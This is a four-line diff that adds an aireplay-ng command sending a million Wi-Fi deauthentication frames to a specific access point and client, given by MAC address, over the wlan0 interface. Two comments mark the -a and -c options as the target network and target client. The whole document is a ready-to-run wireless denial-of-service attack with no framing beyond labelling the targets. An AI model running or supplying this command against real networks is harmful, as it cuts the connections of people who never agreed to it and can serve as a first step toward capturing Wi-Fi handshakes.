@@ -1,0 +1,4 @@
+aireplay-ng --deauth 1000000 -a 90:8D:78:55:7A:A4 -c 8C:B8:4A:8F:A0:9B wlan0
+
+# a target network
+# c target client
